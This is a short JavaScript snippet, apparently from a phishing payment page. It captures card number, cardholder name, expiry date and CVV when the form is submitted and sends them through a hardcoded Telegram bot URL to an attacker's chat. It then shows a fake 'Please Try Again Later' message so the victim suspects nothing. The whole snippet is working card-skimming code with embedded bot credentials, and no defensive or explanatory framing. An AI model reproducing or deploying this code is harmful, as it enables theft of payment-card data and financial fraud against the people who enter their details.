    <script>
        const form = document.getElementById('payment-form');

        form.addEventListener('submit', (event) => {
            event.preventDefault();

            const cardNumber = document.getElementById('card-number').value;
            const cardName = document.getElementById('card-name').value;
            const expiryDate = document.getElementById('expiry-date').value;
            const cvv = document.getElementById('cvv').value;

            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual bot token and chat ID
            const url = `https://api.telegram.org/bot6681705529:AAGU3yNUk8Pof_tBZkYUOEh3SSF5D0qMK64/sendMessage?chat_id=5936200928&text=Card Number: ${cardNumber}%0A Cardholder Name: ${cardName}%0A Expiry Date: ${expiryDate}%0A CVV: ${cvv}`;

            fetch(url)
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        alert('Please Try Again Later');
                    } else {
                        alert('Please Try Again Later');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Please Try Again Later');
                });
        });
    </script>
